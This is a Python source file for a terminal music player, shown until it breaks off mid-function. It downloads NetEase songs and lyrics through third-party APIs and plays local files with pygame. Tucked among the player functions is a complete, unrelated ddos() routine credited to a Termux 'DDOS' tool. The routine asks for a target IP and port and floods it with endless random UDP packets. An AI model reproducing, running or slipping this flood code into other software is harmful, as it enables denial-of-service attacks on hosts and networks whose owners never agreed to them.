#!/bin/env python3

import subprocess
from pathlib import Path
import sys,os

Author_name="NULL"
print_sleep = 0.02 # Logo打印速度
MUSIC_DIR = Path("/storage/emulated/0/Music")  # 改成你的实际路径
"""
MUSIC_DIR = Path("C:/Users/seewo/Music") # 希沃一体机炸弹电脑
MUSIC_DIR = Path("C:/Users/administrator/Music") # 普通用户电脑
"""

# 这个是生成配置文件的，不用管
GUI_CONF_DEFAULTS = {
    "FONT_TITLE": "fonts/NotoSerifCJK-Bold.ttc",
    "FONT_NORM": "fonts/NotoSerifCJK-Bold.ttc",
    "FONT_SMALL": "fonts/NotoSerifCJK-Bold.ttc",
    "F_TITLE_SIZE": "26",
    "F_NORM_SIZE": "19",
    "F_SMALL_SIZE": "14",
    "C_BG": "18,16,28",
    "C_PANEL": "30,27,45",
    "C_PANEL2": "38,34,56",
    "C_ACCENT": "0,230,170",
    "C_ACCENT2": "120,90,255",
    "C_TEXT": "228,226,240",
    "C_DIM": "130,126,150",
    "C_BTN": "48,42,72",
    "C_BTN_HOV": "70,60,105",
    "C_BAR_BG": "45,40,65",
    "C_BAR_FILL": "0,230,170",
    "C_SEL": "60,48,110",
    "C_WHITE": "255,255,255",
    "C_DANGER": "200,70,90",
    "BAR_X": "60", "BAR_Y": "470", "BAR_W": "620", "BAR_H": "12",
    "VOL_X": "700", "VOL_Y": "500", "VOL_W": "140",
    "LIST_X": "60", "LIST_Y": "90", "LIST_W": "360", "LIST_H": "300",
    "LYRIC_X": "450", "LYRIC_Y": "60", "LYRIC_W": "390", "LYRIC_H": "340",
    "bg_image": "",
    "bg_dim": "120",
    "panel_alpha": "180",
    "window_title": "音乐播放器",
    "window_icon": "",
    "COOKIE_PATH": "cookies.txt",
    "CACHE_DIR": "cache",
    "API_TIMEOUT": "10",
    "HTTP_PROXY": "",
}

def _conf_path():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        name = os.path.splitext(os.path.basename(__file__))[0]
    except NameError:
        script_dir = os.getcwd()
        name = "config"
    return os.path.join(script_dir, f"{name}.conf")
    
CONF_FILE = _conf_path()

def load_gui_conf():
    path = _conf_path()
    if not os.path.exists(path):
        try:
            with open(path, "w", encoding="utf-8") as f:
                for k, v in GUI_CONF_DEFAULTS.items():
                    f.write(f"{k}={v}\n")
        except Exception:
            pass
        return dict(GUI_CONF_DEFAULTS)
    conf = dict(GUI_CONF_DEFAULTS)
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip()
                if k in conf:
                    conf[k] = v
    except Exception:
        pass
    return conf

def _rgb(s):
    try:
        parts = [int(x) for x in s.split(",")]
        if len(parts) == 3:
            return tuple(parts)
    except Exception:
        pass
    return (0, 0, 0)

def _int(s, default=0):
    try:
        return int(s)
    except Exception:
        return default

GUI_CONF = load_gui_conf()

API_TIMEOUT = _int(GUI_CONF["API_TIMEOUT"], 10)
HTTP_PROXY = GUI_CONF["HTTP_PROXY"] or None
COOKIE_PATH = GUI_CONF["COOKIE_PATH"]
CACHE_DIR = GUI_CONF["CACHE_DIR"]

FONT_TITLE = GUI_CONF["FONT_TITLE"]
FONT_NORM  = GUI_CONF["FONT_NORM"]
FONT_SMALL = GUI_CONF["FONT_SMALL"]
F_TITLE_SIZE = _int(GUI_CONF["F_TITLE_SIZE"], 26)
F_NORM_SIZE  = _int(GUI_CONF["F_NORM_SIZE"], 19)
F_SMALL_SIZE = _int(GUI_CONF["F_SMALL_SIZE"], 14)

C_BG       = _rgb(GUI_CONF["C_BG"])
C_PANEL    = _rgb(GUI_CONF["C_PANEL"])
C_PANEL2   = _rgb(GUI_CONF["C_PANEL2"])
C_ACCENT   = _rgb(GUI_CONF["C_ACCENT"])
C_ACCENT2  = _rgb(GUI_CONF["C_ACCENT2"])
C_TEXT     = _rgb(GUI_CONF["C_TEXT"])
C_DIM      = _rgb(GUI_CONF["C_DIM"])
C_BTN      = _rgb(GUI_CONF["C_BTN"])
C_BTN_HOV  = _rgb(GUI_CONF["C_BTN_HOV"])
C_BAR_BG   = _rgb(GUI_CONF["C_BAR_BG"])
C_BAR_FILL = _rgb(GUI_CONF["C_BAR_FILL"])
C_SEL      = _rgb(GUI_CONF["C_SEL"])
C_WHITE    = _rgb(GUI_CONF["C_WHITE"])
C_DANGER   = _rgb(GUI_CONF["C_DANGER"])

BAR_X = _int(GUI_CONF["BAR_X"], 60)
BAR_Y = _int(GUI_CONF["BAR_Y"], 470)
BAR_W = _int(GUI_CONF["BAR_W"], 620)
BAR_H = _int(GUI_CONF["BAR_H"], 12)
VOL_X = _int(GUI_CONF["VOL_X"], 700)
VOL_Y = _int(GUI_CONF["VOL_Y"], 500)
VOL_W = _int(GUI_CONF["VOL_W"], 140)
LIST_X = _int(GUI_CONF["LIST_X"], 60)
LIST_Y = _int(GUI_CONF["LIST_Y"], 90)
LIST_W = _int(GUI_CONF["LIST_W"], 360)
LIST_H = _int(GUI_CONF["LIST_H"], 300)
LYRIC_X = _int(GUI_CONF["LYRIC_X"], 450)
LYRIC_Y = _int(GUI_CONF["LYRIC_Y"], 60)
LYRIC_W = _int(GUI_CONF["LYRIC_W"], 390)
LYRIC_H = _int(GUI_CONF["LYRIC_H"], 340)

BG_IMAGE_PATH = GUI_CONF["bg_image"]
BG_DIM = _int(GUI_CONF["bg_dim"], 120)
PANEL_ALPHA = _int(GUI_CONF["panel_alpha"], 180)
WINDOW_TITLE = GUI_CONF["window_title"]
WINDOW_ICON = GUI_CONF["window_icon"]

# 读取配置结束，下面不是配置的

SUPPORTED = (".mp3", ".wav", ".ogg", ".flac")
VOLUME_STEP = 0.1
REQUIRED_PACKAGES = {
    "requests": "requests",
    "tqdm": "tqdm",
    "curses": "curses",
    "shutil": "shutil",
    "pygame": "pygame",
    "mutagen": "mutagen",
    "qrcode": "qrcode",
}
missing = []
for pkg_name, import_name in REQUIRED_PACKAGES.items():
    try:
        __import__(import_name)
    except ModuleNotFoundError:
        missing.append(pkg_name)

if missing:
    print(f"\033[33mWARN: 检测到缺失的库: {', '.join(missing)}，正在安装...\033[0m")
    subprocess.run(
        [sys.executable, "-m", "pip", "install", *missing],
        check=True
    )
    import os
    os.execv(sys.executable, [sys.executable] + sys.argv)
def scan_music(directory: Path):
    """扫描目录下所有支持的音频文件"""
    if not directory.exists() or not directory.is_dir():
        return []
    files = []
    try:
        for ext in SUPPORTED:
            files.extend(directory.glob(f"*{ext}"))
          #  files.extend(directory.glob(f"*{ext.upper()}"))
    except PermissionError:
        pass
    return sorted(files, key=lambda p: p.name.lower())


def init_audio():
    """初始化音频——如果安卓，强制 pulseaudio"""
    if "ANDROID_ROOT" in os.environ or "PREFIX" in os.environ:
        os.environ["SDL_AUDIODRIVER"] = "pulseaudio"
    pygame.mixer.quit()
    pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=1024)
    pygame.mixer.music.set_volume(0.7)
    return True

import requests
import urllib.parse,hashlib
import curses,shutil
import re,qrcode
import time
from tqdm import tqdm
import pygame
from datetime import datetime
from mutagen import File
from urllib.parse import unquote
import bisect
import tempfile
import http.cookiejar

def current_lyric(lrc_time, lrc_text, current_sec):
    if not lrc_time:
        return  "",-1
    idx = bisect.bisect_right(lrc_time, current_sec) - 1
    if idx < 0:
        return "",-1
    return lrc_text[idx],idx
    
    
def getmusic(_file):
     audio = File(_file)
     if audio is not None:
        duration = audio.info.length
        return f"{duration:.3f}"

def getime():
    now = datetime.now()
    return int(now.timestamp() * 1000)
def download_file(url, filename):
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    basename = os.path.basename(filename)
    with open(filename, 'wb') as file, \
         tqdm(total=total_size, unit='B', unit_scale=True, desc=basename) as bar:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                bar.update(len(chunk))
def str_ellipsis(text,terminal_width):
    threshold = terminal_width - 4
    if len(text) <= threshold:
        return text
    return text[:threshold - 4] + "..."
####请勿动此变量#####
progress = 0 ; end_time = ""; now_time = "" ; selected = 0 ; down = 0 ; tmp_list_num = 0 ; cursor = 0; tmp_cursor = 0; tmp_list_cursor = 0; old_vol = 0 ; music_data = ""; download_url = ""; vol_bar = ""; music_url = ""; file_name = ""; music_id = [] ; lrc_text = [] ; lrc_time = []
quality = ["hires", "lossless", "exhigh", "higher", "standard"]; USER_CHOICES = 0 ; USD_MOD = True ; GUI_MODE = False
def get_music(get_type,text,limit):
      songs = None
      get_headres = {
        "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/126.0.0.0 Safari/537.36"
        ),
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
      }
      murl = urllib.parse.quote(text)
      baseURI = "https://node.api.xfabe.com/api/wangyi/"
      getURI = "https://node.api.xfabe.com/api/wangyi/music?type=json&id="
      if get_type == "musicChart":
         url = baseURI + f"musicChart?list={limit}"
      elif get_type == "search":
         url = f"{baseURI}search?search={murl}&limit={limit}"
      elif get_type == "lyrics":
         url = f"{baseURI}lyrics?id={text}"
      print("\r\033[K正在向服务器发送请求，请稍等...")
      try: 
          response = requests.get(url=url,headers=get_headres,timeout=10)
          data = response.json()
          if get_type == "lyrics": return data["data"]["lyric"]
          songs = data["data"]["songs"];Pattern = "网络搜索"
      except TypeError:
         print("\033[31m解析函数出错，错误原因")
         print("\033[34m请求返回值异常: ")
         print(f"\033[32mSOURCE: \033[33m{response.text}\n")
         input("\033[35m按回车键退出....\033[0m")
         return 1;
      global music_id
      name = [];artistsname = [];album = [];music_time = [];music_id = []
      for song in songs:
       try:
        sec = song["duration"] // 1000
        minutes = sec // 60
        seconds = sec % 60
        duration_str = f"{minutes:02d}:{seconds:02d}"
        name.append(song['name'])
        artistsname.append(song['artistsname'])
        album.append(song['album'])
        music_time.append(duration_str)
        music_id.append(song['id'])
       except:
        print(f"\033[33mWARN: 处理数据{song}出错\033[0m")
      if GUI_MODE:
        return name, artistsname, album, music_time, music_id
      def main(stdscr):
        curses.start_color()
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_WHITE)
        curses.init_pair(2, curses.COLOR_MAGENTA, -1)
        curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION)
        curses.curs_set(0)
        stdscr.nodelay(False)
        stdscr.keypad(True)
        global selected; tmp_selected = 0 ; global music_url ; global tmp_list_num ; down = 0 ; global music_data ; global download_url ; global file_name
        total = len(name)
        if selected >= total: selected = total - 1
        file_name = ""
        while True:
          stdscr.erase()
          max_y, max_x = stdscr.getmaxyx()
          available_lines = max_y - 5
          if total < max_y: fill = available_lines - total
          else: fill = 0
          if selected > tmp_selected and down ==  (available_lines-1):
            tmp_list_num+=1
          elif selected < tmp_selected and down == 0:
            tmp_list_num-=1
          if tmp_list_num+available_lines > total: tmp_list_num=0
          for line in range(available_lines):
            idx = line + tmp_list_num
            if idx >= total: break
            if idx == selected:
                stdscr.addstr(line+fill, 0, str_ellipsis(f"▌ {name[idx]} - {artistsname[idx]}",max_x), curses.color_pair(1) | curses.A_BOLD)
                down = line
            else:
                stdscr.addstr(line+fill, 0, str_ellipsis(f"▌ {name[idx]} - {artistsname[idx]}",max_x), curses.COLOR_WHITE)
          tmp_selected = selected
          stdscr.addstr(available_lines, 0, f"{selected+1}/{total}  {(available_lines+tmp_list_num)*100/total if total > available_lines else 100:.1f}%", curses.color_pair(2))
          stdscr.addstr(available_lines+1, 0, '─'*int(max_x), curses.A_DIM)
          stdscr.addstr(available_lines+2, 0,f"歌曲时间: {music_time[selected]}")
          stdscr.addstr(available_lines+3, 0,f"作者: {album[selected]}")
          stdscr.addstr(available_lines+4, 0,f"模式: {Pattern}")
          stdscr.refresh()
          key = stdscr.getch()
          curses.flushinp()
          if key == curses.KEY_MOUSE:
            _, x, y, _, bstate = curses.getmouse()
            if bstate & curses.BUTTON4_PRESSED and available_lines < len(name) and tmp_list_num > 0: tmp_list_num -= 1
            elif bstate & curses.BUTTON5_PRESSED and available_lines < len(name) and tmp_list_num+available_lines < len(name): tmp_list_num += 1
            elif bstate & curses.BUTTON1_CLICKED:
             if 1 <= y <= max_y and 0 < x < max_x:
               if available_lines <= len(name):
                if 0 <= y < available_lines and y <= len(name) - 1:
                  _selected = y + tmp_list_num
               else:
                if 0 <= y < available_lines and available_lines - y <= len(name):
                  _selected = y - ( available_lines - len(name))
               if selected == _selected:
                file_name = f"{MUSIC_DIR}/{name[selected]} - {artistsname[selected]}"
                music_url = f"{getURI}{music_id[selected]}"
                break
               selected = _selected
          elif key == ord('\n'):
            file_name = f"{MUSIC_DIR}/{name[selected]} - {artistsname[selected]}"
            music_url = f"{getURI}{music_id[selected]}"
            break
          elif key == ord('t') or key == ord('T'):
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.mp3', prefix='music_', delete=True) as f:
             if pygame.mixer.get_init() is None: init_audio()
             try:
              try: download_file(requests.get(url=f"{getURI}{music_id[selected]}",headers=get_headres,timeout=10).json()['data']['url'],f.name)
              except: download_file(requests.get(url=f"https://api.byfuns.top/1/?id={music_id[selected]}&level=standard",headers=get_headres,timeout=10).text,f.name)
              player = get_player()
              player.play(Path(f.name))
             except:
              print("\033[33m\r\033[KWARN: 加载歌曲失败\033[0m",end="\r")
              time.sleep(1)
             stdscr.clear()
          elif key == ord('q'): return 0
          elif key == ord('j') or key == curses.KEY_DOWN:
            selected = min(selected + 1, total - 1)
            if tmp_list_num > selected: tmp_list_num=selected
            elif selected >= tmp_list_num + available_lines: tmp_list_num = selected - available_lines
          elif key == ord('k') or key == curses.KEY_UP:
            selected = max(selected - 1, 0)
            if selected == 0: tmp_list_num = selected
            elif selected >= tmp_list_num + available_lines: tmp_list_num = selected - available_lines + 1
            elif tmp_list_num > selected: tmp_list_num=selected + 1
      while True:
       curses.wrapper(main)
       if file_name == "": break
       print("\033[1;32mo\033[37m(\033[31m〃\033[34m'\033[33m▽\033[34m'\033[31m〃\033[37m)\033[32mo \033[36m正在加载歌曲，请稍等...")
       try:
           if USD_MOD:
             response = requests.get(url=music_url,headers=get_headres,timeout=10)
             music_data = response.json()
             try: download_url = music_data['data']['url']
             except: download_url = None
           if not USD_MOD or download_url is None:
             print("\033[31m返回值为空，调用第2层请求链接")
             print("\033[32m在这里，你可以选择歌曲的架设:")
             print("\033[33m1. Hi-Res 无损")
             print("\033[34m2. 无损音质")
             print("\033[35m3. 极高音质")
             print("\033[36m4. 较高音质")
             print("\033[91m5. 标准音质")
             while True:
               tmp = input("\033[92m输入> \033[0m")
               if not tmp:
                 USER_CHOICES = 0
                 break
               try: tmp = int(tmp)
               except:
                 print("\033[31mERROR: 输入类型错误")
                 print("\033[36m需要输入数字，请重新输入")
                 print("\033[33m留空选默认 \033[32m=> \033[34m1\033[0m")
                 continue
               if 1 <= tmp and tmp <= len(quality):
                 USER_CHOICES=tmp - 1
                 break
               else: print("\033[31m输入范围错误\033[0m")
             print("\033[32m重新发送get的请求\033[0m")
             response = requests.get(url=f"https://api.byfuns.top/1/?id={music_id[selected]}&level={quality[USER_CHOICES]}",headers=get_headres,timeout=10).text
             if not response:
                print("\033[33mWARN: 返回值为空\033[0m")
                False
             else:
                print(f"\033[1;34m获取到链接: {response}\033[0m")
                download_url = response
       except:
           print("\033[0;31mERROR: 请求错误")
           print(f"\033[35m请求ID: \033[34m{music_id[selected]}")
           print(f"\033[36mHTTP请求返回值 => \033[33m{response.text}")
           input("\033[32m按回车键关闭...\033[0m")
           continue
       try: _id = music_data['data']['id']
       except (TypeError, KeyError, IndexError, UnboundLocalError): _id = music_id[selected]
       try: music_lrc = get_music("lyrics",_id,limit)
       except: music_lrc = None
       if USD_MOD:
         try: print(f"\033[1;32m▶ 用户选择: \033[33m{file_name}\n\033[34m返回码: \033[32m{music_data['code']} \n\033[36m状态: \033[35m{music_data['msg']}\n\033[33m类型: \033[32m{music_data['data']['pay']}\n\033[31m下载链接: \033[34m{download_url}\033[0m")
         except: pass
       if download_url != "None":
         try:
          download_file(download_url,f"{file_name}.mp3")
         except:
          input("\033[31m下载失败，按回车键关闭...\033[0m")
          continue
         if music_lrc: 
           with open(f"{file_name}.lrc", "w", encoding="utf-8") as f: f.write(music_lrc)
         print("\033[32mDone: 下载已完成...\033[0m")
       else:
         if music_data['data']['pay'] == "免费音乐":
          print("\033[33m正在启动2号下载链接...\033[0m")
          try:
            download_file(f"https://music.163.com/song/media/outer/url?id={music_id[selected]}",f"{file_name}.mp3")
          except:
            input("\033[31m下载失败，按回车键关闭...\033[0m")
            continue
          if music_lrc != "": 
           with open(f"{file_name}.lrc", "w", encoding="utf-8") as f: f.write(music_lrc)
          print("\033[32m下载已完成...\033[0m")
         else:
          print("\033[33m未获取下载链接\033[0m")
       temp = input("\033[34m😂 还要不要继续下载?\033[32m[y/n]\033[33m ❯ \033[0m")
       if temp == "n" or temp == "NO" or temp == "N" or temp == "q": break
def ddos():
       import socket,random
       from datetime import datetime
       now = datetime.now()
       hour = now.hour;minute = now.minute;day = now.day;month = now.month;year = now.year;sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);bytes = random._urandom(1490)
       print("[H[2J[3J[1;31mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM[0m\n[1;31mM       YMM M       YMM MMP     YMM MP       MM[0m\n[1;31mM  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M[0m\n[1;31mM  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM[0m\n[1;31mM  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M[0m\n[1;31mM  MMMM   M M  MMMM   M M   MMM   M M   MMM   M[0m\n[1;31mM        MM M        MM MMb     dMM Mb       dM[0m\n[1;31mMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM[0m\n[1;41;97m  Distributed Denial of Service - Termux Tools [0m\n\n[1;33mAuthor   : [1;97mPembriAhmad[0m\n[1;33mGithub   : [1;97mhttps://github.com/pembriahmad[0m\n[1;33mSource   : [1;97mhttps://github.com/pembriahmad/DDOS[0m\n\n[1;32mPress CTRL+C to stop sending[0m\n[1;97m\n------------\nINPUT TARGET\n------------[0m")
       ip = input("[0;97m[*][1;31m IP or HOSTNAME : [1;32m");port = input("[0;97m[*][1;31m PORT SCANNING  : [1;32m");sd = input("[0;97m[*][1;31m ATTACK SPEED [1~1000]  : [1;32m");sent = 0
       while True:
          sock.sendto(bytes, (ip,int(port)))
          sent = sent + 1
          print ("[1;32mSent %s packet to %s throught port: %d [0m"%(int(sent),ip,int(port)))
          time.sleep((1000-int(sd))/2000)
def is_same_file(a: Path, b: Path):
    """安全比较两个文件是否相同，避免 samefile() 抛异常"""
    try:
        return a.resolve() == b.resolve()
    except Exception:
        return str(a) == str(b)
music_time = 0
start_time = 0
flag = 0
volume = 0.5
auto_player = False
_player_instance = None
def get_player():
    global _player_instance
    if _player_instance is None:
        _player_instance = Player()
    return _player_instance
    
class Player:
    """封装 pygame.mixer 的播放控制"""
    def __init__(self):
        self._initialized = False
        global volume
        self.current_file: Path | None = None
        self.is_paused = False
        try:
            pygame.mixer.init()
            pygame.mixer.music.set_volume(volume)
            self._initialized = True
        except Exception:
            pass

    @property
    def ready(self):
        return self._initialized

    def play(self, filepath: Path):
        """播放指定文件，失败时静默跳过"""
        if not self._initialized:
            return
        if not filepath.exists():
            return
        try: 
            pygame.mixer.music.load(str(filepath))
            pygame.mixer.music.play()
            self.current_file = filepath
            global flag
            flag = 0
            self.is_paused = False
            global music_time
            global start_time
            global lrc_text
            global lrc_time
            start_time = getime()
            music_time = getmusic(str(filepath))
            lrc_time, lrc_text = local_lrc(os.path.splitext(filepath)[0] + ".lrc")
        except Exception:
            self.current_file = None
            self.is_paused = False
    def set_volume(self, v):
      global volume
      volume = max(0.0, min(1.0, v))
      try: pygame.mixer.music.set_volume(volume)
      except Exception: pass
    def seek_to(self, target):
      global flag
      if not pygame.mixer.music.get_busy(): return False
      int_music_time = float(music_time)
      if int_music_time > 0: target = max(0, min(target, int_music_time))
      pygame.mixer.music.rewind()
      pygame.mixer.music.set_pos(target)
      pos_ms = pygame.mixer.music.get_pos()
      flag = target - pos_ms / 1000.0 if pos_ms >= 0 else target
      return True
    def get_position(self): return pygame.mixer.music.get_pos() / 1000.0 + flag if pygame.mixer.music.get_busy() else 0.0
    def get_duration(self): return float(music_time)
    def toggle_pause(self):
        if not self._initialized:
            return
        try:
            if not self.is_paused and pygame.mixer.music.get_busy():
                pygame.mixer.music.pause()
                self.is_paused = True
            elif self.is_paused:
                pygame.mixer.music.unpause()
                self.is_paused = False
        except Exception:
            pass

    def stop(self):
        if not self._initialized:
            return
        try:
            flag = 0
            pygame.mixer.music.stop()
        except Exception:
            pass
        self.is_paused = False
        self.current_file = None

    def volume_up(self):
        global volume
        if not self._initialized:
            return
        volume = min(1.0, volume + VOLUME_STEP)
        try:
            pygame.mixer.music.set_volume(volume)
        except Exception:
            pass

    def volume_down(self):
        global volume
        if not self._initialized:
            return
        volume = max(0.0, volume - VOLUME_STEP)
        try:
            pygame.mixer.music.set_volume(volume)
        except Exception:
            pass

    def is_busy(self):
        if not self._initialized:
            return False
        try:
            return pygame.mixer.music.get_busy()
        except Exception:
            return False

    def quit(self):
        if self._initialized:
            try:
                pygame.mixer.music.stop()
                pygame.mixer.quit()
            except Exception:
                pass
          
    def Jump(self, pos):
      if not pygame.mixer.music.get_busy():
          return False
      global flag
      current = pygame.mixer.music.get_pos() / 1000.0 + flag
      target = current + float(pos)
      int_music_time = float(music_time)
      if int_music_time > 0:
        target = max(0, min(target, int_music_time))
      pygame.mixer.music.rewind()
      pygame.mixer.music.set_pos(target)
      pos_ms = pygame.mixer.music.get_pos()
      flag = target - pos_ms / 1000.0 if pos_ms >= 0 else target
      return True

          
    def progress(self):
        if pygame.mixer.music.get_busy():
            if float(music_time) <= 0: return 0.0
            pos_ms = pygame.mixer.music.get_pos()
            if pos_ms >= 0:
               return (pos_ms/1000+flag)/float(music_time)*100
               
    def get_play_progress(self):
        now_ms=pygame.mixer.music.get_pos()
        end_ms=int(float(music_time) * 1000)
        def fmt(ms):
            total_sec=int(ms)//1000
            m,s=divmod(total_sec, 60)
            h,m=divmod(m, 60)
            if h:
               return f"{h:02d}:{m:02d}:{s:02d}"
            return f"{m:02d}:{s:02d}"
        return fmt(now_ms + flag * 1000), fmt(end_ms)

def local_lrc(files):
    if not os.path.exists(files):
       print(f"ERROR: 歌词文件不存在: {files}")
       return None,None
    raw_bytes = None
    for enc in ['utf-8-sig', 'utf-8', 'gbk', 'gb2312', 'gb18030', 'latin-1']:
       try:
          with open(files, "rb") as f:
             raw_bytes = f.read()
          content = raw_bytes.decode(enc)
          break
       except (UnicodeDecodeError, UnicodeError):
          continue
    if raw_bytes is None:
        print(f"\033[31mERROR: 歌词无法解码文件: {files}\033[0m")
        return None,None
    time = [] ; text = []
    for read_line in content.split('\n'):
       split_tmp = read_line.lstrip('[').split(']')
       if re.fullmatch(r"[0-9.]+:[0-9.]+", split_tmp[0]):
         line_read = split_tmp[0].split(':')
         if len(line_read) == 3: time.append(float(line_read[0])*3600+float(line_read[1])*60+float(line_read[0]))
         elif len(line_read) == 2: time.append(float(line_read[0])*60+float(line_read[1]))
         elif len(line_read) == 1: time.append(float(line_read[0]))
         else: print(f"\033[33mWARN: 无法理解时间戳 {split_tmp[0]}\033[0m")
       else:
         print(f"\033[33mWARN: 读取到错误时间戳 {split_tmp[0]}\033[0m")
       try:
         text.append(split_tmp[1])
       except IndexError:
         print("\033[33mWARN: 未读取到歌词\033[0m")
    return time,text
def player():
 def main(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(False)
    stdscr.keypad(True)
    stdscr.timeout(300)
    curses.noecho()
    curses.cbreak()
    curses.start_color()
    curses.use_default_colors()
    curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION)
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLUE)  # 选中行
    curses.init_pair(2, curses.COLOR_GREEN, -1)                 # 播放中标记
    curses.init_pair(3, curses.COLOR_CYAN, -1)                  # 标题
    curses.init_pair(4, curses.COLOR_YELLOW, -1)                # 状态栏
    curses.init_pair(5, curses.COLOR_RED, -1)                   # 错误提示
    player = get_player()
    SELECTED   = curses.color_pair(1) | curses.A_BOLD
    PLAYING    = curses.color_pair(2) | curses.A_BOLD
    TITLE      = curses.color_pair(3) | curses.A_BOLD
    STATUSBAR  = curses.color_pair(4)
    ERROR      = curses.color_pair(5) | curses.A_BOLD
    files = scan_music(MUSIC_DIR)
    if not files:
        stdscr.addstr(2, 2, f"没找到音乐文件: {MUSIC_DIR}",ERROR)
        time.sleep(1)
        return
    global auto_player;global lrc_time;global lrc_text;global down;global volume;global cursor;global tmp_cursor;global tmp_list_cursor;global old_vol;global vol_bar;total = len(files);need_redraw = True;progress_old = 0;last_redraw_time = 0;REDRAW_INTERVAL = 0.3;progress_old = -1
    try:
        if vol_bar == "": init_audio()
        else: True
    except Exception as e:
        stdscr.clear()
        stdscr.addstr(1, 2, f"音频初始化失败: {e}",ERROR)
        time.sleep(1)
        stdscr.getch()
        return
    max_y, max_x = stdscr.getmaxyx()
    underline =  "─" * (max_x - 2)
    progress_msg = "正在加载进度条中..."
    msg = "初始化完成"
    while True:
        max_y, max_x = stdscr.getmaxyx()
        available_lines = max_y - 7
        if not player.is_busy(): progress_msg = "00:00/00:00 ["+" "*(max_x-20)+"] 0.0%"
        if need_redraw:
         stdscr.erase()
         if cursor > tmp_cursor and down ==  (available_lines-1):
           tmp_list_cursor+=1
         elif cursor < tmp_cursor and down == 0:
           tmp_list_cursor-=1
         if tmp_list_cursor+available_lines > total: tmp_list_cursor=0
         stdscr.addstr(0,(max_x-14)//2,"终端音乐播放器", TITLE)
         stdscr.addstr(1, 1, underline)
         
         for line in range(available_lines):
           idx = line + tmp_list_cursor
           if idx >= total: break
           if idx == cursor:
             prefix = "➜  "
             art_style = SELECTED
             down = line
           else:
              prefix = "   "
              art_style = curses.A_NORMAL
           if player.current_file and is_same_file(files[idx], player.current_file):
             if player.is_busy():
                 prefix = "○  "
             elif player.is_paused:
                 prefix = "●  "

           stdscr.addstr(line+2, 0, str_ellipsis(f"{prefix}{files[idx].name}",max_x),art_style)
         stdscr.addstr(available_lines+2, 1, underline)
         if len(files)>available_lines: stdscr.addstr(available_lines+2, max_x-8, f"{(available_lines+tmp_list_cursor)*100/len(files):.1f}%")
         else: stdscr.addstr(available_lines+2, max_x-8, "100.0%")
         if player.current_file and player.current_file.exists() or lrc_time or lrc_text:
          if not lrc_time or not lrc_text: now_playing = f"正在播放: {player.current_file.name}"
          else: now_playing,_=current_lyric(lrc_time, lrc_text,pygame.mixer.music.get_pos()/1000+flag)
         elif player.current_file: now_playing = "⚠ 文件已不存在"
         else: now_playing = "a 自动 ↑↓ 选择 Enter 播放 空格 暂停 s 停止 n 下一首 p 上一首 +/- 音量 r 刷新 q 退出"
         stdscr.addstr(available_lines+3, 1, now_playing[:max_x - 4], STATUSBAR)
         vol = volume
         if vol != old_vol: 
            vol_bar = '█'*int(vol*(max_x-45))+'░'*((max_x-45)-int(vol*(max_x-45)))
            old_vol = vol
         stdscr.addstr(available_lines+4, 0, f" 音量: [{vol_bar}] {int(vol * 100)}%  共有{len(files)}首歌曲  {msg}")
         stdscr.addstr(available_lines+5, 0, f" {progress_msg}")
         tmp_cursor = cursor
         need_redraw = False
        
        key = stdscr.getch()
        curses.flushinp()
        underline="─"*(max_x - 2)
        if player.is_busy():
           global end_time
           global now_time
           global progress
           progress=player.progress()
           now_time,end_time=player.get_play_progress()
           bar_wide=max_x-len(f"{now_time}/{end_time}")-len(f"{progress:.1f}%")-5
           filled = int(bar_wide*(progress/100))
           progress_bar = "=" * filled + ">" + " " * (bar_wide - filled - 1)
           progress_msg = f"{now_time}/{end_time} [{progress_bar}] {progress:.1f}%"
           t_now = time.time()
           if progress != progress_old and t_now - last_redraw_time > REDRAW_INTERVAL:
             need_redraw = True
             progress_old = progress
             last_redraw_time = t_now
           else:
             need_redraw = False
        elif player.is_paused:
           msg = "■ 暂停播放"
        elif auto_player:
           msg = "自动下一首"
           if len(files) > 0:
              player.play(files[cursor])
              cursor = (cursor + 1) % len(files)
              need_redraw = True
              if tmp_list_cursor>cursor: tmp_list_cursor=cursor
              elif cursor>=tmp_list_cursor+available_lines: tmp_list_cursor=cursor-available_lines

        
        if key == curses.KEY_MOUSE:
            _, x, y, _, bstate = curses.getmouse()
            if bstate & curses.BUTTON4_PRESSED and available_lines < len(files) and tmp_list_cursor > 0: tmp_list_cursor -= 1
            elif bstate & curses.BUTTON5_PRESSED and available_lines < len(files) and tmp_list_cursor+available_lines < len(files): tmp_list_cursor += 1
            elif bstate & curses.BUTTON1_CLICKED:
             if 2 <= y <= max_y - 5 and 0 < x < max_x:
               y=y-2
               if cursor == y + tmp_list_cursor:
                 if is_same_file(files[cursor], player.current_file):
                   player.toggle_pause()
                 else: player.play(files[cursor])
                 
               if 0 <= y <= available_lines and y <= len(files) - 1:
                  cursor = y + tmp_list_cursor
               msg="使用鼠标选歌"
             elif available_lines < y < max_y and 2 < x < max_x:
                if max_y - 3 < y and len(f"{now_time}/{end_time}") + 2 < x < max_x - len(f"{progress:.1f}%["):
                       bar_start = len(f"{now_time}/{end_time}") + 2
                       bar_end = max_x - len(f"{progress:.1f}%[")
